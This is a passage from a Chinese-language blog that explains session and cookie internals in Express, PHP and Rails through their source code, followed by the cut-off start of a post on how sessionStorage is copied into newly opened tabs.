Cookie 與 Session 早期的歷史。 最後，別忘了這是系列文的第二篇，下一篇我們會來看一些主流框架如何處理 Session。 三篇的完整連結如下： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作","link":"/2019/08/09/session-and-cookie-part2/"},{"title":"深入 Session 與 Cookie：Express、PHP 與 Rails 的實作","text":"前言這是一系列共三篇的文章，我稱之為 Session 與 Cookie 三部曲。系列文的目標是想要由淺入深來談談這個經典議題，從理解概念一直到理解實作方式。這是系列文的最後一篇，三篇的完整連結如下： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作 第一篇以白話的方式來談 Session 與 Cookie，全篇沒有談到太多技術名詞；第二篇直接去看 Cookie 的三份 RFC 來理解到底什麼是 Session，也補齊了一些 Cookie 相關的知識。而這一篇則是要深入 Session，一起帶大家看看三種不同的 Session 實作方式。 這三樣分別是 Node.js 的 Web 框架 Express、PHP 以及 Ruby on Rails。會挑選這三個是因為他們對於 Session 機制的實作都不同，是我覺得很適合拿來參考的對象。 好，接著就開始吧！ ExpressExpress 本身是個極度輕量的框架，有許多其他框架底下的基本功能，在這邊都要額外安裝 middleware 才能使用。 先來簡單介紹一下 middleware 的概念。在 Express 裡面，當收到一個 Request 之後就會轉交給相對應的 middleware 來做處理，處理完以後變成 Response 回傳回去。所以 Express 的本質其實就是一大堆 middleware。 用圖解釋的話會長這樣： 舉個例子好了，一段基本的程式碼會長這樣： const express = require('express') const app = express() const port = 5001 // global 的 middleware app.use((req, res, next) => &#123; req.greeting = 'hello' next() &#125;) // 特定 route 的 middleware app.get('/', (req, res) => &#123; res.end(req.greeting) &#125;) app.listen(port, () => &#123; console.log(`Example app listening on port $&#123;port&#125;!`) &#125;) 第一個 middleware 是 global 的，所以任何 request 都會先到達這個 middleware，而這邊可以對 req 或是 res 這兩個參數設置一些東西，最後呼叫 next 把控制權轉給下一個 middleware。 而下一個 middleware 就可以拿到前面的 middleware 處理過後的資訊，並且輸出內容。如果沒有呼叫 next，代表不想把控制權轉移給下個 middleware。 在 Express 裡面，管理 Session 的 middleware 是 express-session，範例程式碼長這樣（改寫自官網範例）： const express = require('express') const session = require('express-session') const app = express() const port = 5001 // 使用 session middleware app.use(session(&#123; secret: 'keyboard cat' &#125;)) app.get('/', function(req, res, next) &#123; // 可以用 req.session 拿取存在 session 的值 // 這邊判斷有沒有 req.session.views // 如果有的話就 +1，反之初始化成 1 // 所以 req.session 可讀也可寫 if (req.session.views) &#123; req.session.views++ res.write('views: ' + req.session.views) res.end() &#125; else &#123; req.session.views = 1 res.end('welcome to the session demo. refresh!') &#125; &#125;) app.listen(port, () => &#123; console.log(`Example app listening on port $&#123;port&#125;!`) &#125;) 使用了 session middleware 以後，可以直接用 req.session.key 來存取你要的資訊，同一個變數可以寫入也可以讀取，跟 PHP 的 $_SESSION 有異曲同工之妙。 接著我們來看看 express-session 的程式碼吧！主要的程式碼都在 index.js 這個檔案，大概有快七百行，不太可能一行一行講解。 而且寫得好的 library，會花很多精力在向後相容以及資料合法性的檢查，這些都是一些比較瑣碎而且對於想要理解機制比較沒幫助的東西。 所以我會直接把程式碼稍微整理一下，去除掉比較不重要的部分並且重新組織程式碼，只挑出相關的段落。 我們會關注三個重點： sessionID 如何產生 sessionID 儲存方式 session 資訊儲存方式 可以先來看產生 sessionID 的地方： // get the session id generate function var generateId = opts.genid || generateSessionId // generates the new session store.generate = function(req)&#123; req.sessionID = generateId(req); req.session = new Session(req); req.session.cookie = new Cookie(cookieOptions); if (cookieOptions.secure === 'auto') &#123; req.session.cookie.secure = issecure(req, trustProxy); &#125; &#125;; function generateSessionId(sess) &#123; return uid(24); &#125; express-session 的客製化程度很高，可以自己傳進去產生 sessionID 的函式。若是沒有傳，預設會使用 uid(24)，這邊的 uid 指的是 uid-safe 這個 library，會產生一個長度為 24 bytes 的隨機 ID。 文件上有特別說明這個長度： Asynchronously create a UID with a specific byte length. Because base64 encoding is used underneath, this is not the string length. For example, to create a UID of length 24, you want a byte length of 18. 所以填入 24，最後產生出來的會是長度為 32 個字元的字串。 那這個 sessionID 是以什麼樣的形式存進 Cookie 的呢？ var cookie = require('cookie') var signature = require('cookie-signature') // get the session cookie name var name = opts.name || opts.key || 'connect.sid' // get the cookie signing secret var secret = opts.secret if (secret &amp;&amp; !Array.isArray(secret)) &#123; secret = [secret]; &#125; // set-cookie onHeaders(res, function()&#123; // set cookie setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data); &#125;); function setcookie(res, name, val, secret, options) &#123; var signed = 's:' + signature.sign(val, secret); var data = cookie.serialize(name, signed, options); debug('set-cookie %s', data); var prev = res.getHeader('Set-Cookie') || [] var header = Array.isArray(prev) ? prev.concat(data) : [prev, data]; res.setHeader('Set-Cookie', header) &#125; 存在 cookie 裡面的 sessionID 的 key 一樣可以自己指定，但預設會是 connect.sid，所以以後一看到這個 key 就知道這是 express-session 預設的 sessionID 名稱。 內容的部分比較特別一點，會以 s: 開頭，後面接上 signature.sign(sessionID, secret) 的結果。 這邊要再看到 cookie-signature 這個 library，底下是一個簡單範例： var cookie = require('cookie-signature'); var val = cookie.sign('hello', 'tobiiscool'); val.should.equal('hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI'); 這邊的 sign 到底做了什麼呢？原始碼很簡單，可以稍微看一下： var crypto = require('crypto'); /** * Sign the given `val` with `secret`. * * @param &#123;String&#125; val * @param &#123;String&#125; secret * @return &#123;String&#125; * @api private */ exports.sign = function(val, secret)&#123; if ('string' != typeof val) throw new TypeError(\"Cookie value must be provided as a string.\"); if ('string' != typeof secret) throw new TypeError(\"Secret string must be provided.\"); return val + '.' + crypto .createHmac('sha256', secret) .update(val) .digest('base64') .replace(/\\=+$/, ''); &#125;; 就只是把你要 sign 的內容用 hmac-sha256 產生一個鑑別碼，並且加在字串後面而已，中間會用.來分割資料。 若是你不知道什麼是 hmac 的話我稍微提一下，簡單來說就是可以對一串訊息產生鑑別碼，目的是為了保持資料的完整性讓它不被竄改。你可以想成它就是訊息對應到的一組獨一無二的代碼，如果訊息被改掉了，代碼也會不一樣。 以上面的範例來說，hello 利用 tobiiscool 這個 secret，得到的結果為：DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI，於是完整字串就變為：hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI，前面是我的資料，後面是資料的鑑別碼。 如果有人想竄改資料，例如說把前面改成 hello2，那這個資料的鑑別碼就不會是後面那一串，我就知道有人篡改資料了。所以藉由這樣的方式來保持資料完整性，其實原理跟 JWT 是差不多的，你看得到資料但沒辦法改它，因為改了會被發現。 你可能會疑惑說：那我幹嘛不把整個 sessionID 加密就好？為什麼要多此一舉用這種方式？我自己猜測是因為原始資料其實不怕別人看，只是怕人改而已；若是原始資料是敏感資訊，會用加密的方式。但因為原始資料只是 sessionID 而已，被別人看到也沒什麼關係，只要保障資料完整性即可。而且加密需要的系統資源應該比這種訊息驗證還多，因此才採用這種方式。 好，我們再講回來前面，所以 express-session 會把 sessionID 存在 cookie 裡面，key 是 connect.sid，value 則是 s:&#123;sessionID&#125;.&#123;hmac-sha256(sessionID, secret)&#125;。 好奇的話你可以去任何使用 Express 的網站然後看一下 cookie 內容，就可以找到實際的資料（或是自己隨便執行一個也行），這邊我用我的當作範例，我的 connect.sid 是： s%3AfZZVCDHefchle2LDK4PzghaR3Ao9NruG.J%2BsOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM，把特殊字元 decode 之後變成： s:fZZVCDHefchle2LDK4PzghaR3Ao9NruG.J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM。 也就是說我的 sessionID 是fZZVCDHefchle2LDK4PzghaR3Ao9NruG，鑑別碼是J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM。 知道儲存 sessionID 的方式以後，從 cookie 裡面取得 sessionID 的方式應該也能看懂，就是把事情反過來做而已： // get the session ID from the cookie var cookieId = req.sessionID = getcookie(req, name, secrets); function getcookie(req, name, secrets) &#123; var header = req.headers.cookie; var raw; var val; // read from cookie header if (header) &#123; var cookies = cookie.parse(header); raw = cookies[name]; if (raw) &#123; if (raw.substr(0, 2) === 's:') &#123; val = unsigncookie(raw.slice(2), secrets); if (val === false) &#123; debug('cookie signature invalid'); val = undefined; &#125; &#125; else &#123; debug('cookie unsigned') &#125; &#125; &#125; return val; &#125; /** * Verify and decode the given `val` with `secrets`. * * @param &#123;String&#125; val * @param &#123;Array&#125; secrets * @returns &#123;String|Boolean&#125; * @private */ function unsigncookie(val, secrets) &#123; for (var i = 0; i &lt; secrets.length; i++) &#123; var result = signature.unsign(val, secrets[i]); if (result !== false) &#123; return result; &#125; &#125; return false; &#125; 接下來就剩最後一個了，session 資訊到底存在哪裡？是存在記憶體、檔案，還是其他地方？ 其實這個在程式碼裡面寫得很清楚了，預設是存在記憶體裡面的： var warning = 'Warning: connect.session() MemoryStore is not\\n' + 'designed for a production environment, as it will leak\\n' + 'memory, and will not scale past a single process.'; // get the session store var store = opts.store || new MemoryStore() // notify user that this store is not // meant for a production environment /* istanbul ignore next: not tested */ if (env === 'production' &amp;&amp; store instanceof MemoryStore) &#123; console.warn(warning); &#125; 那到底是怎麼存呢？可以參考 session&#x2F;memory.js： function MemoryStore() &#123; Store.call(this) this.sessions = Object.create(null) &#125; MemoryStore.prototype.get = function get(sessionId, callback) &#123; defer(callback, null, getSession.call(this, sessionId)) &#125; MemoryStore.prototype.set = function set(sessionId, session, callback) &#123; this.sessions[sessionId] = JSON.stringify(session) callback &amp;&amp; defer(callback) &#125; function getSession(sessionId) &#123; var sess = this.sessions[sessionId] if (!sess) &#123; return &#125; // parse sess = JSON.parse(sess) return sess &#125; 首先用 Object.create(null) 創造出一個乾淨的 Object（這是很常用的一個方法，沒看過的可以參考：詳解 Object.create(null)），然後以 sessionID 作為 key，JSON.stringigy(session)作為 value，存到這個 object 裡面。 所以說穿了其實 express-session 的 session information 預設就是存在一個變數裡面而已啦，因此你只要一把 process 結束掉重開，session 的資料就都全部不見了。而且會有 memory leak 的問題，所以官方也不推薦用在 production 上面。 如果要用在 production 上面，必須額外再找store來用，例如說 connect-redis 就可以跟 express-session 搭配，把 session information 存在 redis 裡。 以上就是 Express 常用的 middleware：express-session 的原始碼分析。從上面的段落我們清楚知道了 sessionID 的產生方式以及如何存在 cookie，還有 session information 所儲存的地方。 PHP（7.2 版本）PHP 內建就有 session 機制，不必使用任何的 framework，而使用的方法也很簡單： &lt;?php session_start(); if (empty($_SESSION['views'])) &#123; $_SESSION['views'] = 1; &#125; else &#123; $_SESSION['views']++; &#125; echo $_SESSION['views']; ?> 其實跟 express-session 的用法有點像，只是一個是 req.session，一個是$_SESSION。 我原本也想跟剛剛看 express-session 一樣，直接去看 PHP 的原始碼，然後從中發現如何實作。但因為 PHP 的原始碼全部都是 C，對我這種幾乎沒寫過 C 的人來說很難看懂，因此我也只能反過來。先跟大家介紹 PHP 的 Session 機制是如何實作的，再從原始碼裡面去找證據支援。 首先呢，PHP 的 Session 機制與 express-session 差不多，都會在 Cookie 裡存放一個 sessionID，並且把 session information 存在伺服器。express-session 預設是存在記憶體，PHP 預設則是存在檔案裡面。 以上這些都可以在 PHP 的設定檔調整，都寫在 php.ini 裡面，底下以我的為例，列出一些相關的設定： [Session] ; Handler used to store/retrieve data. ; http://php.net/session.save-handler session.save_handler=files ; Argument passed to save_handler. In the case of files, this is the path ; where data files are stored. Note: Windows users have to change this ; variable in order to use PHP's session functions. ; ; The path can be defined as: ; ; session.save_path = \"N;/path\" session.save_path=\"/opt/lampp/temp/\" ; Name of the session (used as cookie name). ; http://php.net/session.name session.name=PHPSESSID ; Handler used to serialize data. php is the standard serializer of PHP. ; http://php.net/session.serialize-handler session.serialize_handler=php 在 Cookie 裡面你就能看見一個 PHPSESSID，值大概長得像這樣：fc46356f83dcf5712205d78c51b47c4d，這就是 PHP 所使用的 sessionID。 接著你去 session.save_path 看，就會看到儲存你 session 資訊的檔案，檔名很好認，就是 sess_ 加上 sessionID： root@debian:&#x2F;opt&#x2F;lampp&#x2F;temp# ls adminer.invalid adminer.version sess_04719a35fb67786d574ec6eca969f7cb sess_fc46356f83dcf5712205d78c51b47c4d 若是打開 session 檔案，內容會是被序列化（serialize）之後的結果： views|i:5; 這就是 PHP session 的真面目了。把 session information 全都存在檔案裡面。 若是想要研究 PHP session 的相關原始碼，最重要的檔案就是這兩個：ext&#x2F;session&#x2F;session.c 跟 ext&#x2F;session&#x2F;mod_files.c，前者管理 session 生命週期，後者負責把 session 實際存到檔案裡面或者是讀出來。後者其實就很像我們在 express-session 裡面看到的 Store，只要遵守一樣的 interface，就可以自己寫一個其他的 mod 出來，例如說 mod_redis.c 之類的。 接著我們一樣先來找找看 sessionID 是如何產生的，可以直接在 mod_files.c 搜尋相關字眼，就會找到底下這段： /* * Create session ID. * PARAMETERS: PS_CREATE_SID_ARGS in php_session.h * RETURN VALUE: Valid session ID(zend_string *) or NULL for FAILURE. * * PS_CREATE_SID_FUNC() must check collision. i.e. Check session data if * new sid exists already. * *mod_data is guaranteed to have non-NULL value. * NOTE: Default php_session_create_id() does not check collision. If * NULL is returned, session module create new ID by using php_session_create_id(). * If php_session_create_id() fails due to invalid configuration, it raises E_ERROR. * NULL return value checks from php_session_create_id() is not required generally. */ PS_CREATE_SID_FUNC(files) &#123; zend_string *sid; int maxfail = 3; PS_FILES_DATA; do &#123; sid = php_session_create_id((void**)&amp;data); if (!sid) &#123; if (--maxfail &lt; 0) &#123; return NULL; &#125; else &#123; continue; &#125; &#125; /* Check collision */ /* FIXME: mod_data(data) should not be NULL (User handler could be NULL) */ if (data &amp;&amp; ps_files_key_exists(data, ZSTR_VAL(sid)) == SUCCESS) &#123; if (sid) &#123; zend_string_release(sid); sid = NULL; &#125; if (--maxfail &lt; 0) &#123; return NULL; &#125; &#125; &#125; while(!sid); return sid; &#125; 這邊呼叫了 php_session_create_id 來產生 sessionID，然後會檢查有沒有產生重複的 id，有的話就重試最多三次。而 php_session_create_id 則是存在於 session.c 那個檔案： #define PS_EXTRA_RAND_BYTES 60 PHPAPI zend_string *php_session_create_id(PS_CREATE_SID_ARGS) /* &#123;&#123;&#123; */ &#123; unsigned char rbuf[PS_MAX_SID_LENGTH + PS_EXTRA_RAND_BYTES]; zend_string *outid; /* Read additional PS_EXTRA_RAND_BYTES just in case CSPRNG is not safe enough */ if (php_random_bytes_throw(rbuf, PS(sid_length) + PS_EXTRA_RAND_BYTES) == FAILURE) &#123; return NULL; &#125; outid = zend_string_alloc(PS(sid_length), 0); ZSTR_LEN(outid) = bin_to_readable(rbuf, PS(sid_length), ZSTR_VAL(outid), (char)PS(sid_bits_per_character)); return outid; &#125; 重點其實只有這一個：php_random_bytes_throw，這個 function 如果繼續追下去會找到 ext&#x2F;standard&#x2F;php_random.h，然後找到 ext&#x2F;standard&#x2F;random.c，才是真正產生隨機數的地方。 但最後找到的那個 function 想要看懂必須花一大段時間，因此我就沒有細看了。總之在不同作業系統上會有不同的產生方式，其中一種還會使用到 &#x2F;dev&#x2F;urandom。 知道了 sessionID 的產生方式以後，我們來看看 PHP 的 session information 是怎麼做 serialize 的。可以在官方文件上看到一個 function 叫做：session_encode，輸出的結果跟我們在 session 檔案裡面看到的資料一模一樣，而這個 function 的敘述寫著： session_encode() returns a serialized string of the contents of the current session data stored in the $_SESSION superglobal. By default, the serialization method used is internal to PHP, and is not the same as serialize(). The serialization method can be set using session.serialize_handler. 接著我們直接在 session.c 裡面搜尋session_encode，會找到這一段： /* &#123;&#123;&#123; proto string session_encode(void) Serializes the current setup and returns the serialized representation */ static PHP_FUNCTION(session_encode) &#123; zend_string *enc; if (zend_parse_parameters_none() == FAILURE) &#123; return; &#125; enc = php_session_encode(); if (enc == NULL) &#123; RETURN_FALSE; &#125; RETURN_STR(enc); &#125; 只是一個 php_session_encode 的 wrapper 而已，而且 php_session_encode 也只是再呼叫別的東西： static zend_string *php_session_encode(void) /* &#123;&#123;&#123; */ &#123; IF_SESSION_VARS() &#123; if (!PS(serializer)) &#123; php_error_docref(NULL, E_WARNING, \"Unknown session.serialize_handler. Failed to encode session object\"); return NULL; &#125; return PS(serializer)->encode(); &#125; else &#123; php_error_docref(NULL, E_WARNING, \"Cannot encode non-existent session\"); &#125; return NULL; &#125; /* &#125;&#125;&#125; */ return PS(serializer)-&gt;encode(); 這一句才是重點。其實追到這邊的時候就有點卡住，因為不清楚這邊的 serializer 是從哪邊來的。但往下稍微看一下程式碼，找到一段應該是相關的： #define PS_DELIMITER '|' PS_SERIALIZER_ENCODE_FUNC(php) /* &#123;&#123;&#123; */ &#123; smart_str buf = &#123;0&#125;; php_serialize_data_t var_hash; PS_ENCODE_VARS; PHP_VAR_SERIALIZE_INIT(var_hash); PS_ENCODE_LOOP( smart_str_appendl(&amp;buf, ZSTR_VAL(key), ZSTR_LEN(key)); if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) &#123; PHP_VAR_SERIALIZE_DESTROY(var_hash); smart_str_free(&amp;buf); return NULL; &#125; smart_str_appendc(&amp;buf, PS_DELIMITER); php_var_serialize(&amp;buf, struc, &amp;var_hash); ); smart_str_0(&amp;buf); PHP_VAR_SERIALIZE_DESTROY(var_hash); return buf.s; &#125; /* &#125;&#125;&#125; */ 會知道相關是因為 #define PS_DELIMITER &#39;|&#39; 這一行，這個符號在 session 檔案裡有出現，可以猜測應該是拿來分隔什麼東西的。而實際的值則是交給php_var_serialize處理。 php_var_serialize若是繼續往下追，可以找到 ext&#x2F;standard&#x2F;var.c（直接用 GitHub 搜尋功能就可以找到這個檔案，搜尋功能超方便的），最後就會找到真正在處理的地方：php_var_serialize_intern，裡面會針對不同的形態去呼叫不同的 function。 以我們之前存在 session 裡面的 views 來說，是一個數字，所以會跑到這個 function： static inline void php_var_serialize_long(smart_str *buf, zend_long val) /* &#123;&#123;&#123; */ &#123; smart_str_appendl(buf, \"i:\", 2); smart_str_append_long(buf, val); smart_str_appendc(buf, ';'); &#125; /* &#125;&#125;&#125; */ 追到這邊，就知道為什麼當初 session 序列化之後的結果是views|i:5;了。|拿來分隔 key 跟 value，i 代表著型態，5 代表實際的數字，; 則是結束符號。 以上就是 PHP Session 機制的相關原始碼分析，我們稍微看了如何產生 sessionID 以及 session information 如何做序列化。也知道了以預設的狀態來說，cookie 名稱會叫做 PHPSESSID，而且會以檔案的方式來儲存 session 的內容。 最後來分享兩個跟 PHP Session 有關的文章，都十分有趣： HITCON CTF 2018 - One Line PHP Challenge [Web Security] 透過 LFI 引入 PHP session 檔案觸發 RCE Rails（5.2 版本）Rails 是一個 Ruby 的 Web 框架，俗稱 Ruby on Rails。會挑這一套是因為我本來就知道它儲存 session 的方法不太一樣。我當初只是好奇 Rails 怎麼生成 sessionID 的，於是就去 GitHub 的 repo 搜尋：session，然後找到這個檔案：rails&#x2F;actionpack&#x2F;test&#x2F;dispatch&#x2F;session&#x2F;cookie_store_test.rb，是個測試，但有時候測試其實對找程式碼幫助也很大，因為裡面會出現一堆相關的 function 跟參數。 我那時觀察了一陣子，發現裡面出現了很多次的 session_id，於是就改用這個關鍵字搜尋，找到了 rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rb，發現裡面的註解把 Rails 的 Session 實作方式寫得一清二楚： # This cookie-based session store is the Rails default. It is # dramatically faster than the alternatives. # # Sessions typically contain at most a user_id and flash message; both fit # within the 4K cookie size limit. A CookieOverflow exception is raised if # you attempt to store more than 4K of data. # # The cookie jar used for storage is automatically configured to be the # best possible option given your application's configuration. # # If you only have secret_token set, your cookies will be signed, but # not encrypted. This means a user cannot alter their +user_id+ without # knowing your app's secret key, but can easily read their +user_id+. This # was the default for Rails 3 apps. # # Your cookies will be encrypted using your apps secret_key_base. This # goes a step further than signed cookies in that encrypted cookies cannot # be altered or read by users. This is the default starting in Rails 4. # # Configure your session store in &lt;tt>config/initializers/session_store.rb&lt;/tt>: # # Rails.application.config.session_store :cookie_store, key: '_your_app_session' # # In the development and test environments your application's secret key base is # generated by Rails and stored in a temporary file in &lt;tt>tmp/development_secret.txt&lt;/tt>. # In all other environments, it is stored encrypted in the # &lt;tt>config/credentials.yml.enc&lt;/tt> file. # # If your application was not updated to Rails 5.2 defaults, the secret_key_base # will be found in the old &lt;tt>config/secrets.yml&lt;/tt> file. # # Note that changing your secret_key_base will invalidate all existing session. # Additionally, you should take care to make sure you are not relying on the # ability to decode signed cookies generated by your app in external # applications or JavaScript before changing it. # # Because CookieStore extends Rack::Session::Abstract::Persisted, many of the # options described there can be used to customize the session cookie that # is generated. For example: # # Rails.application.config.session_store :cookie_store, expire_after: 14.days # # would set the session cookie to expire automatically 14 days after creation. # Other useful options include &lt;tt>:key&lt;/tt>, &lt;tt>:secure&lt;/tt> and # &lt;tt>:httponly&lt;/tt>. Rails 預設使用 cookie-based session，因為它比其他解決方案都來得快。雖然 cookie 有大小限制，但頂多只會存 flash message 跟 user_id，離 4k 的上限還有一大段距離。 在 Rails 3 裡面 cookie 只會被 signed 不會被加密，意思就是使用者看得到 user_id 但沒辦法改它（就像我們在 express-session 看到的 sessionID 一樣，看得到但不能改）。 而 Rails 4 以後預設就會把 cookie 的值整個加密，什麼都看不到。在測試環境時 Rails 會自動幫你產生一個 secret 來加密，也可以透過 Rails 的設定檔來設定。 在這份檔案中也可以看到有一個 function 叫做generate_sid，是拿來產生 sessionID 的。這個 function 存在於 rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;abstract_store.rb： def generate_sid sid = SecureRandom.hex(16) sid.encode!(Encoding::UTF_8) sid end 直接呼叫了 Ruby 的函式庫 SecureRandom 來產生亂數並當作 sessionID。 至於在 Cookie 裡面的 key 是什麼，可以經由設定 app.config.session_store 來調整。根據這邊的程式碼： # Setup default session store if not already set in config/application.rb initializer :setup_default_session_store, before: :build_middleware_stack do |app| unless app.config.session_store? app_name = app.class.name ? app.railtie_name.chomp(\"_application\") : \"\" app.config.session_store :cookie_store, key: \"_#&#123;app_name&#125;_session\" end end 預設值會是 _#&#123;app_name&#125;_session，例如說我的 app_name 叫做 huli，Cookie 名稱就會是 _huli_session。 然後把 session information 實際寫進去 cookie 的地方在 rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rb： def set_cookie(request, session_id, cookie) cookie_jar(request)[@key] = cookie end def get_cookie(req) cookie_jar(req)[@key] end def cookie_jar(request) request.cookie_jar.signed_or_encrypted end 會呼叫與 cookie 相關的 signed_or_encrypted 來做處理。 接著我去搜了一下文件，發現其實官方文件都寫得十分清楚了： The session ID is generated using SecureRandom.hex which generates a random hex string using platform specific methods (such as OpenSSL, &#x2F;dev&#x2F;urandom or Win32 CryptoAPI) for generating cryptographically secure random numbers. Currently it is not feasible to brute-force Rails’ session IDs. 上面這段寫了 sessionID 的產生方式。 The CookieStore uses the encrypted cookie jar to provide a secure, encrypted location to store session data. Cookie-based sessions thus provide both integrity as well as confidentiality to their contents. The encryption key, as well as the verification key used for signed cookies, is derived from the secret_key_base configuration value. As of Rails 5.2 encrypted cookies and sessions are protected using AES GCM encryption. This form of encryption is a type of Authenticated Encryption and couples authentication and encryption in single step while also producing shorter ciphertexts as compared to other algorithms previously used. The key for cookies encrypted with AES GCM are derived using a salt value defined by the config.action_dispatch.authenticated_encrypted_cookie_salt configuration value. 這段則是寫說從 Rails 5.2 開始採用 AES GCM 來加密，底下還有一個段落我沒複製，主要是提到之前程式碼註解裡面寫的，Rails 4 前只用 HMAC 來做驗證，而不是加密。 而且我看一看之後發現這文件寫的好棒喔，除了把這些機制說明清楚以外，底下還介紹了我們上一篇提到的 Session Fixation Attack 以及 CSRF。 若是還想深入研究，可以參考 Rails 裡面 Cookie 相關的實作：rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;cookies.rb，註解裡面有詳細的說明，例如說加密的部分： # Returns a jar that'll automatically encrypt cookie values before sending them to the client and will decrypt them for read. # If the cookie was tampered with by the user (or a 3rd party), +nil+ will be returned. # # If +secret_key_base+ and +secrets.secret_token+ (deprecated) are both set, # legacy cookies signed with the old key generator will be transparently upgraded. # # If +config.action_dispatch.encrypted_cookie_salt+ and +config.action_dispatch.encrypted_signed_cookie_salt+ # are both set, legacy cookies encrypted with HMAC AES-256-CBC will be transparently upgraded. # # This jar requires that you set a suitable secret for the verification on your app's +secret_key_base+. # # Example: # # cookies.encrypted[:discount] = 45 # # => Set-Cookie: discount=DIQ7fw==--K3n//8vvnSbGq9dA--7Xh91HfLpwzbj1czhBiwOg==; path=/ # # cookies.encrypted[:discount] # => 45 def encrypted @encrypted ||= EncryptedKeyRotatingCookieJar.new(self) end 往底下追的話就可以看到 EncryptedKeyRotatingCookieJar 的完整程式碼，或你也可以再往下，看看 rails&#x2F;activesupport&#x2F;lib&#x2F;active_support&#x2F;message_encryptor.rb，負責加密的程式碼長這樣： def _encrypt(value, **metadata_options) cipher = new_cipher cipher.encrypt cipher.key = @secret # Rely on OpenSSL for the initialization vector iv = cipher.random_iv cipher.auth_data = \"\" if aead_mode? encrypted_data = cipher.update(Messages::Metadata.wrap(@serializer.dump(value), metadata_options)) encrypted_data &lt;&lt; cipher.final blob = \"#&#123;::Base64.strict_encode64 encrypted_data&#125;--#&#123;::Base64.strict_encode64 iv&#125;\" blob = \"#&#123;blob&#125;--#&#123;::Base64.strict_encode64 cipher.auth_tag&#125;\" if aead_mode? blob end 這裡的 cipher 是從 openssl 來的，所以最底層是使用了 openssl。 整理到這邊應該就差不多了，就不再繼續深入了。 總結在這篇裡面我們看了三個不同的 Session 儲存方式。第一種是 express-session，把 session information 存在記憶體裡面；第二種是 PHP，存在檔案裡面；最後一種則是 Rails，採用了之前提過的 cookie-based session，將資訊直接加密並且存在 cookie 裡。 在這系列當中，第一篇文章我們理解了概念，第二篇利用讀 RFC 加深印象並重新理解了一次 Session，最後一篇則是直接參考一些主流框架的實作，看看我們之前所提到的 sessionID 應該如何產生，session information 應該存在哪裡，cookie-bases session 又應該如何實作。 寫這系列的初衷就是想讓大家把這些概念一次理解清楚，就不用以後每次碰到都重新查一遍。 最後，希望這系列對大家有幫助，有任何錯誤都可以在底下留言反映。 底下是系列文的完整清單： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作","link":"/2019/08/09/session-and-cookie-part3/"},{"title":"從 SessionStorage 開始一場 spec 之旅","text":"前言如果你想把東西存在網頁前端，也就是存在瀏覽器裡面，基本上就是以下這幾個選項： Cookie LocalStorage SessionStorage IndexedDB Web SQL 後兩者應該滿少用到的，而最後一個 Web SQL 也早在幾年前就被宣告已經不再維護了。因此在談到儲存資料的時候，大部分的人提的還是前三種，其中又以前兩種最多人使用。 畢竟在前端儲存資料時，大部分資料都希望能儲存一段時間，而 cookie 跟 localStorage 就是被設計在這種情形下用的，可是 sessionStorage 不是，它只適合儲存非常短期的資料。 不知道大家對 sessionStorage 的理解是不是跟我一樣，先說說我的理解好了： sessionStorage 跟 localStorage 最大的差別在於前者只會存在於一個分頁當中，你分頁關掉之後資料就清除了，所以新開分頁，就會有新的 sessionStorage，在不同分頁不會共用。但後者如果是相同的網站，可以共用同一個 localStorage 但我想問大家的是：有沒有可能有一種情況，我在分頁 A 的 sessionStorage 存了一些東西，然後有一個新的分頁 B，也可以讀到分頁 A 的 sessionStorage？ 你可能以為沒有，我以前也以為沒有，我同事也這樣認為。 但偏偏就是有。 我不懂 sessionStorage如同前言所說的，我對 sessionStorage 的理解就是它只會存在於一個 tab 當中，tab 關掉就沒了，然後開新 tab 也不會共享到原本的資料，所以可以很安心地假設 tab 裡的 sessionStorage 只有他自己讀得到。 但之前在公司內部的技術分享上，我主管 howard 分享了一個案例： 假設有一個頁面 A，用了 sessionStorage 儲存了一些資料，然後網站裡有個 a 的超連結，點了連到同個 origin 下的頁面 B，應該很多人會預期頁面 B 的 sessionStorage 是空的。但沒有，它會沿用頁面 A 的。 沒錯，就是這個案例打破了我對 sessionStorage 的天真幻想，原來兩個不同的分頁是有可能共用同一份 sessionStorage 的。 或是嚴格來講，其實不是共用，而是原本的 sessionStorage 會「複製」一份到新開的 tab 去，如果在頁面 A 改變了值，頁面 B 拿不到更新後的值。頁面 B 只是把「點開連結那一刻的 sessionStorage」複製過去而已。 我準備了一個 demo 讓大家玩，就是兩個簡單的頁面而已，先附上網址：sessionStorage demo。 頁面長這個樣子： 這頁面的程式碼很簡單，基本上就是設置一個 name=guest 的 sessionStorage，然後把它顯示在螢幕上。然後有一個 a 可以連到新的 tab，另一個按鈕隨機更新 sessionStorage 裡的值： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>SessionStorage 範例&lt;/title> &lt;meta charset=\"utf-8\"> &lt;script> sessionStorage.setItem('name', 'guest') &lt;/script> &lt;/head> &lt;body> &lt;div> 進來這網站之後，會自動幫你設置一個 sessionStorage，name=\"guest\" &lt;br> 你可以打開 devtool -> applications 或是打開 console，或檢查下面內容確認 &lt;/div> &lt;div> sessionStorage 內容：&lt;b>&lt;/b> &lt;/div> &lt;button id=\"btn\">改變 sessionStorage 內容&lt;/button>&lt;br> &lt;a href=\"new_tab.html\" target=\"_blank\">Click me to see magic(?)&lt;/a> &lt;script> document.querySelector('b').innerText = 